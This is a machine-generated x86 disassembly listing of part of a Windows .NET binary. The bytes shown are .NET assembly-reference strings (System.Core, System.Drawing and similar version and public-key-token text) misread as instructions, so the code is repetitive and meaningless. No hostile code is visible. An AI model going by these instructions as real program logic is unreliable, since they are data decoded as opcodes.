  406a3c:	and    BYTE PTR [eax],al
  406a3e:	push   esi
  406a3f:	add    BYTE PTR [ebp+0x0],ah
  406a42:	jb     0x406a44
  406a44:	jae    0x406a46
  406a46:	imul   eax,DWORD PTR [eax],0x6e006f
  406a4c:	cmp    eax,0x2e003400
  406a51:	add    BYTE PTR [eax],dh
  406a53:	add    BYTE PTR [esi],ch
  406a55:	add    BYTE PTR [eax],dh
  406a57:	add    BYTE PTR [esi],ch
  406a59:	add    BYTE PTR [eax],dh
  406a5b:	add    BYTE PTR [eax+eax*1],ch
  406a5e:	and    BYTE PTR [eax],al
  406a60:	inc    ebx
  406a61:	add    BYTE PTR [ebp+0x0],dh
  406a64:	ins    BYTE PTR es:[edi],dx
  406a65:	add    BYTE PTR [eax+eax*1+0x75],dh
  406a69:	add    BYTE PTR [edx+0x0],dh
  406a6c:	add    BYTE PTR gs:0x65006e00,bh
  406a73:	add    BYTE PTR [ebp+0x0],dh
  406a76:	je     0x406a78
  406a78:	jb     0x406a7a
  406a7a:	popa   
  406a7b:	add    BYTE PTR [eax+eax*1+0x2c],ch
  406a7f:	add    BYTE PTR [eax],ah
  406a81:	add    BYTE PTR [eax+0x0],dl
  406a84:	jne    0x406a86
  406a86:	bound  eax,QWORD PTR [eax]
  406a88:	ins    BYTE PTR es:[edi],dx
  406a89:	add    BYTE PTR [ecx+0x0],ch
  406a8c:	arpl   WORD PTR [eax],ax
  406a8e:	dec    ebx
  406a8f:	add    BYTE PTR [ebp+0x0],ah
  406a92:	jns    0x406a94
  406a94:	push   esp
  406a95:	add    BYTE PTR [edi+0x0],ch
  406a98:	imul   eax,DWORD PTR [eax],0x65
  406a9b:	add    BYTE PTR [esi+0x0],ch
  406a9e:	cmp    eax,0x30006200
  406aa3:	add    BYTE PTR [ebx],dh
  406aa5:	add    BYTE PTR [esi+0x0],ah
  406aa8:	xor    eax,0x37006600
  406aad:	add    BYTE PTR [esi+0x0],ah
  406ab0:	xor    DWORD PTR [eax],eax
  406ab2:	xor    DWORD PTR [eax],eax
  406ab4:	add    BYTE PTR fs:0x61003000,dh
  406abb:	add    BYTE PTR [ebx],dh
  406abd:	add    BYTE PTR [ecx+0x0],ah
  406ac0:	cmp    BYTE PTR [esi+0x790053],0x73
  406ac7:	add    BYTE PTR [eax+eax*1+0x65],dh
  406acb:	add    BYTE PTR [ebp+0x0],ch
  406ace:	add    BYTE PTR cs:[ebx+0x0],al
  406ad2:	outs   dx,DWORD PTR ds:[esi]
  406ad3:	add    BYTE PTR [esi+0x0],ch
  406ad6:	data16 add BYTE PTR [ecx+0x0],ch
  406ada:	add    BYTE PTR [di+0x0],dh
  406ade:	jb     0x406ae0
  406ae0:	popa   
  406ae1:	add    BYTE PTR [eax+eax*1+0x69],dh
  406ae5:	add    BYTE PTR [edi+0x0],ch
  406ae8:	outs   dx,BYTE PTR ds:[esi]
  406ae9:	add    BYTE PTR [esi],ch
  406aeb:	add    BYTE PTR [ecx+0x0],cl
  406aee:	outs   dx,BYTE PTR ds:[esi]
  406aef:	add    BYTE PTR [ebx+0x0],dh
  406af2:	je     0x406af4
  406af4:	popa   
  406af5:	add    BYTE PTR [eax+eax*1+0x6c],ch
  406af9:	add    BYTE PTR [eax+eax*1],ch
  406afc:	and    BYTE PTR [eax],al
  406afe:	push   esi
  406aff:	add    BYTE PTR [ebp+0x0],ah
  406b02:	jb     0x406b04
  406b04:	jae    0x406b06
  406b06:	imul   eax,DWORD PTR [eax],0x6e006f
  406b0c:	cmp    eax,0x2e003400
  406b11:	add    BYTE PTR [eax],dh
  406b13:	add    BYTE PTR [esi],ch
  406b15:	add    BYTE PTR [eax],dh
  406b17:	add    BYTE PTR [esi],ch
  406b19:	add    BYTE PTR [eax],dh
  406b1b:	add    BYTE PTR [eax+eax*1],ch
  406b1e:	and    BYTE PTR [eax],al
  406b20:	inc    ebx
  406b21:	add    BYTE PTR [ebp+0x0],dh
  406b24:	ins    BYTE PTR es:[edi],dx
  406b25:	add    BYTE PTR [eax+eax*1+0x75],dh
  406b29:	add    BYTE PTR [edx+0x0],dh
  406b2c:	add    BYTE PTR gs:0x65006e00,bh
  406b33:	add    BYTE PTR [ebp+0x0],dh
  406b36:	je     0x406b38
  406b38:	jb     0x406b3a
  406b3a:	popa   
  406b3b:	add    BYTE PTR [eax+eax*1+0x2c],ch
  406b3f:	add    BYTE PTR [eax],ah
  406b41:	add    BYTE PTR [eax+0x0],dl
  406b44:	jne    0x406b46
  406b46:	bound  eax,QWORD PTR [eax]
  406b48:	ins    BYTE PTR es:[edi],dx
  406b49:	add    BYTE PTR [ecx+0x0],ch
  406b4c:	arpl   WORD PTR [eax],ax
  406b4e:	dec    ebx
  406b4f:	add    BYTE PTR [ebp+0x0],ah
  406b52:	jns    0x406b54
  406b54:	push   esp
  406b55:	add    BYTE PTR [edi+0x0],ch
  406b58:	imul   eax,DWORD PTR [eax],0x65
  406b5b:	add    BYTE PTR [esi+0x0],ch
  406b5e:	cmp    eax,0x30006200
  406b63:	add    BYTE PTR [ebx],dh
  406b65:	add    BYTE PTR [esi+0x0],ah
  406b68:	xor    eax,0x37006600
  406b6d:	add    BYTE PTR [esi+0x0],ah
  406b70:	xor    DWORD PTR [eax],eax
  406b72:	xor    DWORD PTR [eax],eax
  406b74:	add    BYTE PTR fs:0x61003000,dh
  406b7b:	add    BYTE PTR [ebx],dh
  406b7d:	add    BYTE PTR [ecx+0x0],ah
  406b80:	sub    BYTE PTR [eax+0x790053],0x73
  406b87:	add    BYTE PTR [eax+eax*1+0x65],dh
  406b8b:	add    BYTE PTR [ebp+0x0],ch
  406b8e:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  406b93:	add    BYTE PTR [eax+0x0],dh
  406b96:	ins    BYTE PTR es:[edi],dx
  406b97:	add    BYTE PTR [edi+0x0],ch
  406b9a:	jns    0x406b9c
  406b9c:	ins    DWORD PTR es:[edi],dx
  406b9d:	add    BYTE PTR [ebp+0x0],ah
  406ba0:	outs   dx,BYTE PTR ds:[esi]
  406ba1:	add    BYTE PTR [eax+eax*1+0x2c],dh
  406ba5:	add    BYTE PTR [eax],ah
  406ba7:	add    BYTE PTR [esi+0x0],dl
  406baa:	add    BYTE PTR gs:[edx+0x0],dh
  406bae:	jae    0x406bb0
  406bb0:	imul   eax,DWORD PTR [eax],0x6e006f
  406bb6:	cmp    eax,0x2e003400
  406bbb:	add    BYTE PTR [eax],dh
  406bbd:	add    BYTE PTR [esi],ch
  406bbf:	add    BYTE PTR [eax],dh
  406bc1:	add    BYTE PTR [esi],ch
  406bc3:	add    BYTE PTR [eax],dh
  406bc5:	add    BYTE PTR [eax+eax*1],ch
  406bc8:	and    BYTE PTR [eax],al
  406bca:	inc    ebx
  406bcb:	add    BYTE PTR [ebp+0x0],dh
  406bce:	ins    BYTE PTR es:[edi],dx
  406bcf:	add    BYTE PTR [eax+eax*1+0x75],dh
  406bd3:	add    BYTE PTR [edx+0x0],dh
  406bd6:	add    BYTE PTR gs:0x65006e00,bh
  406bdd:	add    BYTE PTR [ebp+0x0],dh
  406be0:	je     0x406be2
  406be2:	jb     0x406be4
  406be4:	popa   
  406be5:	add    BYTE PTR [eax+eax*1+0x2c],ch
  406be9:	add    BYTE PTR [eax],ah
  406beb:	add    BYTE PTR [eax+0x0],dl
  406bee:	jne    0x406bf0
  406bf0:	bound  eax,QWORD PTR [eax]
  406bf2:	ins    BYTE PTR es:[edi],dx
  406bf3:	add    BYTE PTR [ecx+0x0],ch
  406bf6:	arpl   WORD PTR [eax],ax
  406bf8:	dec    ebx
  406bf9:	add    BYTE PTR [ebp+0x0],ah
  406bfc:	jns    0x406bfe
  406bfe:	push   esp
  406bff:	add    BYTE PTR [edi+0x0],ch
  406c02:	imul   eax,DWORD PTR [eax],0x65
  406c05:	add    BYTE PTR [esi+0x0],ch
  406c08:	cmp    eax,0x30006200
  406c0d:	add    BYTE PTR [ebx],dh
  406c0f:	add    BYTE PTR [esi+0x0],ah
  406c12:	xor    eax,0x37006600
  406c17:	add    BYTE PTR [esi+0x0],ah
  406c1a:	xor    DWORD PTR [eax],eax
  406c1c:	xor    DWORD PTR [eax],eax
  406c1e:	add    BYTE PTR fs:0x61003000,dh
  406c25:	add    BYTE PTR [ebx],dh
  406c27:	add    BYTE PTR [ecx+0x0],ah
  406c2a:	and    BYTE PTR [eax+0x790053],0x73
  406c31:	add    BYTE PTR [eax+eax*1+0x65],dh
  406c35:	add    BYTE PTR [ebp+0x0],ch
  406c38:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  406c3d:	add    BYTE PTR [ebx+0x0],dh
  406c40:	imul   eax,DWORD PTR [eax],0x6e0067
  406c46:	sub    al,0x0
  406c48:	and    BYTE PTR [eax],al
  406c4a:	push   esi
  406c4b:	add    BYTE PTR [ebp+0x0],ah
  406c4e:	jb     0x406c50
  406c50:	jae    0x406c52
  406c52:	imul   eax,DWORD PTR [eax],0x6e006f
  406c58:	cmp    eax,0x2e003400
  406c5d:	add    BYTE PTR [eax],dh
  406c5f:	add    BYTE PTR [esi],ch
  406c61:	add    BYTE PTR [eax],dh
  406c63:	add    BYTE PTR [esi],ch
  406c65:	add    BYTE PTR [eax],dh
  406c67:	add    BYTE PTR [eax+eax*1],ch
  406c6a:	and    BYTE PTR [eax],al
  406c6c:	inc    ebx
  406c6d:	add    BYTE PTR [ebp+0x0],dh
  406c70:	ins    BYTE PTR es:[edi],dx
  406c71:	add    BYTE PTR [eax+eax*1+0x75],dh
  406c75:	add    BYTE PTR [edx+0x0],dh
  406c78:	add    BYTE PTR gs:0x65006e00,bh
  406c7f:	add    BYTE PTR [ebp+0x0],dh
  406c82:	je     0x406c84
  406c84:	jb     0x406c86
  406c86:	popa   
  406c87:	add    BYTE PTR [eax+eax*1+0x2c],ch
  406c8b:	add    BYTE PTR [eax],ah
  406c8d:	add    BYTE PTR [eax+0x0],dl
  406c90:	jne    0x406c92
  406c92:	bound  eax,QWORD PTR [eax]
  406c94:	ins    BYTE PTR es:[edi],dx
  406c95:	add    BYTE PTR [ecx+0x0],ch
  406c98:	arpl   WORD PTR [eax],ax
  406c9a:	dec    ebx
  406c9b:	add    BYTE PTR [ebp+0x0],ah
  406c9e:	jns    0x406ca0
  406ca0:	push   esp
  406ca1:	add    BYTE PTR [edi+0x0],ch
  406ca4:	imul   eax,DWORD PTR [eax],0x65
  406ca7:	add    BYTE PTR [esi+0x0],ch
  406caa:	cmp    eax,0x30006200
  406caf:	add    BYTE PTR [ebx],dh
  406cb1:	add    BYTE PTR [esi+0x0],ah
  406cb4:	xor    eax,0x37006600
  406cb9:	add    BYTE PTR [esi+0x0],ah
  406cbc:	xor    DWORD PTR [eax],eax
  406cbe:	xor    DWORD PTR [eax],eax
  406cc0:	add    BYTE PTR fs:0x61003000,dh
  406cc7:	add    BYTE PTR [ebx],dh
  406cc9:	add    BYTE PTR [ecx+0x0],ah
  406ccc:	xor    BYTE PTR [esi+0x790053],0x73
  406cd3:	add    BYTE PTR [eax+eax*1+0x65],dh
  406cd7:	add    BYTE PTR [ebp+0x0],ch
  406cda:	add    BYTE PTR cs:[eax+eax*1+0x69],al
  406cdf:	add    BYTE PTR [edx+0x0],dh
  406ce2:	add    BYTE PTR gs:[ebx+0x0],ah
  406ce6:	je     0x406ce8
  406ce8:	outs   dx,DWORD PTR ds:[esi]
  406ce9:	add    BYTE PTR [edx+0x0],dh
  406cec:	jns    0x406cee
  406cee:	push   ebx
  406cef:	add    BYTE PTR [ebp+0x0],ah
  406cf2:	jb     0x406cf4
  406cf4:	jbe    0x406cf6
  406cf6:	imul   eax,DWORD PTR [eax],0x650063
  406cfc:	jae    0x406cfe
  406cfe:	sub    al,0x0
  406d00:	and    BYTE PTR [eax],al
  406d02:	push   esi
  406d03:	add    BYTE PTR [ebp+0x0],ah
  406d06:	jb     0x406d08
  406d08:	jae    0x406d0a
  406d0a:	imul   eax,DWORD PTR [eax],0x6e006f
  406d10:	cmp    eax,0x2e003400
  406d15:	add    BYTE PTR [eax],dh
  406d17:	add    BYTE PTR [esi],ch
  406d19:	add    BYTE PTR [eax],dh
  406d1b:	add    BYTE PTR [esi],ch
  406d1d:	add    BYTE PTR [eax],dh
  406d1f:	add    BYTE PTR [eax+eax*1],ch
  406d22:	and    BYTE PTR [eax],al
  406d24:	inc    ebx
  406d25:	add    BYTE PTR [ebp+0x0],dh
  406d28:	ins    BYTE PTR es:[edi],dx
  406d29:	add    BYTE PTR [eax+eax*1+0x75],dh
  406d2d:	add    BYTE PTR [edx+0x0],dh
  406d30:	add    BYTE PTR gs:0x65006e00,bh
  406d37:	add    BYTE PTR [ebp+0x0],dh
  406d3a:	je     0x406d3c
  406d3c:	jb     0x406d3e
  406d3e:	popa   
  406d3f:	add    BYTE PTR [eax+eax*1+0x2c],ch
  406d43:	add    BYTE PTR [eax],ah
  406d45:	add    BYTE PTR [eax+0x0],dl
  406d48:	jne    0x406d4a
  406d4a:	bound  eax,QWORD PTR [eax]
  406d4c:	ins    BYTE PTR es:[edi],dx
  406d4d:	add    BYTE PTR [ecx+0x0],ch
  406d50:	arpl   WORD PTR [eax],ax
  406d52:	dec    ebx
  406d53:	add    BYTE PTR [ebp+0x0],ah
  406d56:	jns    0x406d58
  406d58:	push   esp
  406d59:	add    BYTE PTR [edi+0x0],ch
  406d5c:	imul   eax,DWORD PTR [eax],0x65
  406d5f:	add    BYTE PTR [esi+0x0],ch
  406d62:	cmp    eax,0x30006200
  406d67:	add    BYTE PTR [ebx],dh
  406d69:	add    BYTE PTR [esi+0x0],ah
  406d6c:	xor    eax,0x37006600
  406d71:	add    BYTE PTR [esi+0x0],ah
  406d74:	xor    DWORD PTR [eax],eax
  406d76:	xor    DWORD PTR [eax],eax
  406d78:	add    BYTE PTR fs:0x61003000,dh
  406d7f:	add    BYTE PTR [ebx],dh
  406d81:	add    BYTE PTR [ecx+0x0],ah
  406d84:	xor    BYTE PTR [eax+0x790053],0x73
  406d8b:	add    BYTE PTR [eax+eax*1+0x65],dh
  406d8f:	add    BYTE PTR [ebp+0x0],ch
  406d92:	add    BYTE PTR cs:[eax+eax*1+0x72],al
  406d97:	add    BYTE PTR [ecx+0x0],ah
  406d9a:	ja     0x406d9c
  406d9c:	imul   eax,DWORD PTR [eax],0x67006e
  406da2:	add    BYTE PTR cs:[eax+eax*1+0x65],al
  406da7:	add    BYTE PTR [ebx+0x0],dh
  406daa:	imul   eax,DWORD PTR [eax],0x6e0067
  406db0:	sub    al,0x0
  406db2:	and    BYTE PTR [eax],al
  406db4:	push   esi
  406db5:	add    BYTE PTR [ebp+0x0],ah
  406db8:	jb     0x406dba
  406dba:	jae    0x406dbc
  406dbc:	imul   eax,DWORD PTR [eax],0x6e006f
  406dc2:	cmp    eax,0x2e003400
  406dc7:	add    BYTE PTR [eax],dh
  406dc9:	add    BYTE PTR [esi],ch
  406dcb:	add    BYTE PTR [eax],dh
  406dcd:	add    BYTE PTR [esi],ch
  406dcf:	add    BYTE PTR [eax],dh
  406dd1:	add    BYTE PTR [eax+eax*1],ch
  406dd4:	and    BYTE PTR [eax],al
  406dd6:	inc    ebx
  406dd7:	add    BYTE PTR [ebp+0x0],dh
  406dda:	ins    BYTE PTR es:[edi],dx
  406ddb:	add    BYTE PTR [eax+eax*1+0x75],dh
  406ddf:	add    BYTE PTR [edx+0x0],dh
  406de2:	add    BYTE PTR gs:0x65006e00,bh
  406de9:	add    BYTE PTR [ebp+0x0],dh
  406dec:	je     0x406dee
  406dee:	jb     0x406df0
  406df0:	popa   
  406df1:	add    BYTE PTR [eax+eax*1+0x2c],ch
  406df5:	add    BYTE PTR [eax],ah
  406df7:	add    BYTE PTR [eax+0x0],dl
  406dfa:	jne    0x406dfc
  406dfc:	bound  eax,QWORD PTR [eax]
  406dfe:	ins    BYTE PTR es:[edi],dx
  406dff:	add    BYTE PTR [ecx+0x0],ch
  406e02:	arpl   WORD PTR [eax],ax
  406e04:	dec    ebx
  406e05:	add    BYTE PTR [ebp+0x0],ah
  406e08:	jns    0x406e0a
  406e0a:	push   esp
  406e0b:	add    BYTE PTR [edi+0x0],ch
  406e0e:	imul   eax,DWORD PTR [eax],0x65
  406e11:	add    BYTE PTR [esi+0x0],ch
  406e14:	cmp    eax,0x30006200
  406e19:	add    BYTE PTR [ebx],dh
  406e1b:	add    BYTE PTR [esi+0x0],ah
  406e1e:	xor    eax,0x37006600
  406e23:	add    BYTE PTR [esi+0x0],ah
  406e26:	xor    DWORD PTR [eax],eax
  406e28:	xor    DWORD PTR [eax],eax
  406e2a:	add    BYTE PTR fs:0x61003000,dh
  406e31:	add    BYTE PTR [ebx],dh
  406e33:	add    BYTE PTR [ecx+0x0],ah
  406e36:	and    BYTE PTR [edx+0x790053],0x73
  406e3d:	add    BYTE PTR [eax+eax*1+0x65],dh
  406e41:	add    BYTE PTR [ebp+0x0],ch
  406e44:	add    BYTE PTR cs:[eax+eax*1+0x72],al
  406e49:	add    BYTE PTR [ecx+0x0],ah
  406e4c:	ja     0x406e4e
  406e4e:	imul   eax,DWORD PTR [eax],0x67006e
  406e54:	sub    al,0x0
  406e56:	and    BYTE PTR [eax],al
  406e58:	push   esi
  406e59:	add    BYTE PTR [ebp+0x0],ah
  406e5c:	jb     0x406e5e
  406e5e:	jae    0x406e60
  406e60:	imul   eax,DWORD PTR [eax],0x6e006f
  406e66:	cmp    eax,0x2e003400
  406e6b:	add    BYTE PTR [eax],dh
  406e6d:	add    BYTE PTR [esi],ch
  406e6f:	add    BYTE PTR [eax],dh
  406e71:	add    BYTE PTR [esi],ch
  406e73:	add    BYTE PTR [eax],dh
  406e75:	add    BYTE PTR [eax+eax*1],ch
  406e78:	and    BYTE PTR [eax],al
  406e7a:	inc    ebx
  406e7b:	add    BYTE PTR [ebp+0x0],dh
  406e7e:	ins    BYTE PTR es:[edi],dx
  406e7f:	add    BYTE PTR [eax+eax*1+0x75],dh
  406e83:	add    BYTE PTR [edx+0x0],dh
  406e86:	add    BYTE PTR gs:0x65006e00,bh
  406e8d:	add    BYTE PTR [ebp+0x0],dh
  406e90:	je     0x406e92
  406e92:	jb     0x406e94
  406e94:	popa   
  406e95:	add    BYTE PTR [eax+eax*1+0x2c],ch
  406e99:	add    BYTE PTR [eax],ah
  406e9b:	add    BYTE PTR [eax+0x0],dl
  406e9e:	jne    0x406ea0
  406ea0:	bound  eax,QWORD PTR [eax]
  406ea2:	ins    BYTE PTR es:[edi],dx
  406ea3:	add    BYTE PTR [ecx+0x0],ch
  406ea6:	arpl   WORD PTR [eax],ax
  406ea8:	dec    ebx
  406ea9:	add    BYTE PTR [ebp+0x0],ah
  406eac:	jns    0x406eae
  406eae:	push   esp
  406eaf:	add    BYTE PTR [edi+0x0],ch
  406eb2:	imul   eax,DWORD PTR [eax],0x65
  406eb5:	add    BYTE PTR [esi+0x0],ch
  406eb8:	cmp    eax,0x30006200
  406ebd:	add    BYTE PTR [ebx],dh
  406ebf:	add    BYTE PTR [esi+0x0],ah
  406ec2:	xor    eax,0x37006600
  406ec7:	add    BYTE PTR [esi+0x0],ah
  406eca:	xor    DWORD PTR [eax],eax
  406ecc:	xor    DWORD PTR [eax],eax
  406ece:	add    BYTE PTR fs:0x61003000,dh
  406ed5:	add    BYTE PTR [ebx],dh
  406ed7:	add    BYTE PTR [ecx+0x0],ah
  406eda:	cmp    BYTE PTR [eax+0x790053],0x73
  406ee1:	add    BYTE PTR [eax+eax*1+0x65],dh
  406ee5:	add    BYTE PTR [ebp+0x0],ch
  406ee8:	add    BYTE PTR cs:[ebp+0x0],al
  406eec:	outs   dx,BYTE PTR ds:[esi]
  406eed:	add    BYTE PTR [eax+eax*1+0x65],dh
  406ef1:	add    BYTE PTR [edx+0x0],dh
  406ef4:	jo     0x406ef6
  406ef6:	jb     0x406ef8
  406ef8:	imul   eax,DWORD PTR [eax],0x650073
  406efe:	push   ebx
  406eff:	add    BYTE PTR [ebp+0x0],ah
  406f02:	jb     0x406f04
  406f04:	jbe    0x406f06
  406f06:	imul   eax,DWORD PTR [eax],0x650063
  406f0c:	jae    0x406f0e
  406f0e:	sub    al,0x0
  406f10:	and    BYTE PTR [eax],al
  406f12:	push   esi
  406f13:	add    BYTE PTR [ebp+0x0],ah
  406f16:	jb     0x406f18
  406f18:	jae    0x406f1a
  406f1a:	imul   eax,DWORD PTR [eax],0x6e006f
  406f20:	cmp    eax,0x2e003400
  406f25:	add    BYTE PTR [eax],dh
  406f27:	add    BYTE PTR [esi],ch
  406f29:	add    BYTE PTR [eax],dh
  406f2b:	add    BYTE PTR [esi],ch
  406f2d:	add    BYTE PTR [eax],dh
  406f2f:	add    BYTE PTR [eax+eax*1],ch
  406f32:	and    BYTE PTR [eax],al
  406f34:	inc    ebx
  406f35:	add    BYTE PTR [ebp+0x0],dh
  406f38:	ins    BYTE PTR es:[edi],dx
  406f39:	add    BYTE PTR [eax+eax*1+0x75],dh
  406f3d:	add    BYTE PTR [edx+0x0],dh
  406f40:	add    BYTE PTR gs:0x65006e00,bh
  406f47:	add    BYTE PTR [ebp+0x0],dh
  406f4a:	je     0x406f4c
  406f4c:	jb     0x406f4e
  406f4e:	popa   
  406f4f:	add    BYTE PTR [eax+eax*1+0x2c],ch
  406f53:	add    BYTE PTR [eax],ah
  406f55:	add    BYTE PTR [eax+0x0],dl
  406f58:	jne    0x406f5a
  406f5a:	bound  eax,QWORD PTR [eax]
  406f5c:	ins    BYTE PTR es:[edi],dx
  406f5d:	add    BYTE PTR [ecx+0x0],ch
  406f60:	arpl   WORD PTR [eax],ax
  406f62:	dec    ebx
  406f63:	add    BYTE PTR [ebp+0x0],ah
  406f66:	jns    0x406f68
  406f68:	push   esp
  406f69:	add    BYTE PTR [edi+0x0],ch
  406f6c:	imul   eax,DWORD PTR [eax],0x65
  406f6f:	add    BYTE PTR [esi+0x0],ch
  406f72:	cmp    eax,0x30006200
  406f77:	add    BYTE PTR [ebx],dh
  406f79:	add    BYTE PTR [esi+0x0],ah
  406f7c:	xor    eax,0x37006600
  406f81:	add    BYTE PTR [esi+0x0],ah
  406f84:	xor    DWORD PTR [eax],eax
  406f86:	xor    DWORD PTR [eax],eax
  406f88:	add    BYTE PTR fs:0x61003000,dh
  406f8f:	add    BYTE PTR [ebx],dh
  406f91:	add    BYTE PTR [ecx+0x0],ah
  406f94:	sub    BYTE PTR [eax+0x790053],0x73
  406f9b:	add    BYTE PTR [eax+eax*1+0x65],dh
  406f9f:	add    BYTE PTR [ebp+0x0],ch
  406fa2:	add    BYTE PTR cs:[ebp+0x0],cl
  406fa6:	popa   
  406fa7:	add    BYTE PTR [esi+0x0],ch
  406faa:	popa   
  406fab:	add    BYTE PTR [edi+0x0],ah
  406fae:	add    BYTE PTR gs:[ebp+0x0],ch
  406fb2:	add    BYTE PTR gs:[esi+0x0],ch
  406fb6:	je     0x406fb8
  406fb8:	sub    al,0x0
  406fba:	and    BYTE PTR [eax],al
  406fbc:	push   esi
  406fbd:	add    BYTE PTR [ebp+0x0],ah
  406fc0:	jb     0x406fc2
  406fc2:	jae    0x406fc4
  406fc4:	imul   eax,DWORD PTR [eax],0x6e006f
  406fca:	cmp    eax,0x2e003400
  406fcf:	add    BYTE PTR [eax],dh
  406fd1:	add    BYTE PTR [esi],ch
  406fd3:	add    BYTE PTR [eax],dh
  406fd5:	add    BYTE PTR [esi],ch
  406fd7:	add    BYTE PTR [eax],dh
  406fd9:	add    BYTE PTR [eax+eax*1],ch
  406fdc:	and    BYTE PTR [eax],al
  406fde:	inc    ebx
  406fdf:	add    BYTE PTR [ebp+0x0],dh
  406fe2:	ins    BYTE PTR es:[edi],dx
  406fe3:	add    BYTE PTR [eax+eax*1+0x75],dh
  406fe7:	add    BYTE PTR [edx+0x0],dh
  406fea:	add    BYTE PTR gs:0x65006e00,bh
  406ff1:	add    BYTE PTR [ebp+0x0],dh
  406ff4:	je     0x406ff6
  406ff6:	jb     0x406ff8
  406ff8:	popa   
  406ff9:	add    BYTE PTR [eax+eax*1+0x2c],ch
  406ffd:	add    BYTE PTR [eax],ah
  406fff:	add    BYTE PTR [eax+0x0],dl
  407002:	jne    0x407004
  407004:	bound  eax,QWORD PTR [eax]
  407006:	ins    BYTE PTR es:[edi],dx
  407007:	add    BYTE PTR [ecx+0x0],ch
  40700a:	arpl   WORD PTR [eax],ax
  40700c:	dec    ebx
  40700d:	add    BYTE PTR [ebp+0x0],ah
  407010:	jns    0x407012
  407012:	push   esp
  407013:	add    BYTE PTR [edi+0x0],ch
  407016:	imul   eax,DWORD PTR [eax],0x65
  407019:	add    BYTE PTR [esi+0x0],ch
  40701c:	cmp    eax,0x30006200
  407021:	add    BYTE PTR [ebx],dh
  407023:	add    BYTE PTR [esi+0x0],ah
  407026:	xor    eax,0x37006600
  40702b:	add    BYTE PTR [esi+0x0],ah
  40702e:	xor    DWORD PTR [eax],eax
  407030:	xor    DWORD PTR [eax],eax
  407032:	add    BYTE PTR fs:0x61003000,dh
  407039:	add    BYTE PTR [ebx],dh
  40703b:	add    BYTE PTR [ecx+0x0],ah
  40703e:	and    BYTE PTR [esi+0x790053],0x73
  407045:	add    BYTE PTR [eax+eax*1+0x65],dh
  407049:	add    BYTE PTR [ebp+0x0],ch
  40704c:	add    BYTE PTR cs:[ebp+0x0],cl
  407050:	add    BYTE PTR gs:[ebx+0x0],dh
  407054:	jae    0x407056
  407056:	popa   
  407057:	add    BYTE PTR [edi+0x0],ah
  40705a:	imul   eax,DWORD PTR [eax],0x67006e
  407060:	sub    al,0x0
  407062:	and    BYTE PTR [eax],al
  407064:	push   esi
  407065:	add    BYTE PTR [ebp+0x0],ah
  407068:	jb     0x40706a
  40706a:	jae    0x40706c
  40706c:	imul   eax,DWORD PTR [eax],0x6e006f
  407072:	cmp    eax,0x2e003400
  407077:	add    BYTE PTR [eax],dh
  407079:	add    BYTE PTR [esi],ch
  40707b:	add    BYTE PTR [eax],dh
  40707d:	add    BYTE PTR [esi],ch
  40707f:	add    BYTE PTR [eax],dh
  407081:	add    BYTE PTR [eax+eax*1],ch
  407084:	and    BYTE PTR [eax],al
  407086:	inc    ebx
  407087:	add    BYTE PTR [ebp+0x0],dh
  40708a:	ins    BYTE PTR es:[edi],dx
  40708b:	add    BYTE PTR [eax+eax*1+0x75],dh
  40708f:	add    BYTE PTR [edx+0x0],dh
  407092:	add    BYTE PTR gs:0x65006e00,bh
  407099:	add    BYTE PTR [ebp+0x0],dh
  40709c:	je     0x40709e
  40709e:	jb     0x4070a0
  4070a0:	popa   
  4070a1:	add    BYTE PTR [eax+eax*1+0x2c],ch
  4070a5:	add    BYTE PTR [eax],ah
  4070a7:	add    BYTE PTR [eax+0x0],dl
  4070aa:	jne    0x4070ac
  4070ac:	bound  eax,QWORD PTR [eax]
  4070ae:	ins    BYTE PTR es:[edi],dx
  4070af:	add    BYTE PTR [ecx+0x0],ch
  4070b2:	arpl   WORD PTR [eax],ax
  4070b4:	dec    ebx
  4070b5:	add    BYTE PTR [ebp+0x0],ah
  4070b8:	jns    0x4070ba
  4070ba:	push   esp
  4070bb:	add    BYTE PTR [edi+0x0],ch
  4070be:	imul   eax,DWORD PTR [eax],0x65
  4070c1:	add    BYTE PTR [esi+0x0],ch
  4070c4:	cmp    eax,0x30006200
  4070c9:	add    BYTE PTR [ebx],dh
  4070cb:	add    BYTE PTR [esi+0x0],ah
  4070ce:	xor    eax,0x37006600
  4070d3:	add    BYTE PTR [esi+0x0],ah
  4070d6:	xor    DWORD PTR [eax],eax
  4070d8:	xor    DWORD PTR [eax],eax
  4070da:	add    BYTE PTR fs:0x61003000,dh
  4070e1:	add    BYTE PTR [ebx],dh
  4070e3:	add    BYTE PTR [ecx+0x0],ah
  4070e6:	and    BYTE PTR [ebx+edx*2+0x73007900],0x0
  4070ee:	je     0x4070f0
  4070f0:	add    BYTE PTR gs:[ebp+0x0],ch
  4070f4:	add    BYTE PTR cs:[esi+0x0],cl
  4070f8:	add    BYTE PTR gs:[eax+eax*1+0x2e],dh
  4070fd:	add    BYTE PTR [eax+0x0],cl
  407100:	je     0x407102
  407102:	je     0x407104
  407104:	jo     0x407106
  407106:	sub    al,0x0
  407108:	and    BYTE PTR [eax],al
  40710a:	push   esi
  40710b:	add    BYTE PTR [ebp+0x0],ah
  40710e:	jb     0x407110
  407110:	jae    0x407112
  407112:	imul   eax,DWORD PTR [eax],0x6e006f
  407118:	cmp    eax,0x2e003400
  40711d:	add    BYTE PTR [eax],dh
  40711f:	add    BYTE PTR [esi],ch
  407121:	add    BYTE PTR [eax],dh
  407123:	add    BYTE PTR [esi],ch
  407125:	add    BYTE PTR [eax],dh
  407127:	add    BYTE PTR [eax+eax*1],ch
  40712a:	and    BYTE PTR [eax],al
  40712c:	inc    ebx
  40712d:	add    BYTE PTR [ebp+0x0],dh
  407130:	ins    BYTE PTR es:[edi],dx
  407131:	add    BYTE PTR [eax+eax*1+0x75],dh
  407135:	add    BYTE PTR [edx+0x0],dh
  407138:	add    BYTE PTR gs:0x65006e00,bh
  40713f:	add    BYTE PTR [ebp+0x0],dh
  407142:	je     0x407144
  407144:	jb     0x407146
  407146:	popa   
  407147:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40714b:	add    BYTE PTR [eax],ah
  40714d:	add    BYTE PTR [eax+0x0],dl
  407150:	jne    0x407152
  407152:	bound  eax,QWORD PTR [eax]
  407154:	ins    BYTE PTR es:[edi],dx
  407155:	add    BYTE PTR [ecx+0x0],ch
  407158:	arpl   WORD PTR [eax],ax
  40715a:	dec    ebx
  40715b:	add    BYTE PTR [ebp+0x0],ah
  40715e:	jns    0x407160
  407160:	push   esp
  407161:	add    BYTE PTR [edi+0x0],ch
  407164:	imul   eax,DWORD PTR [eax],0x65
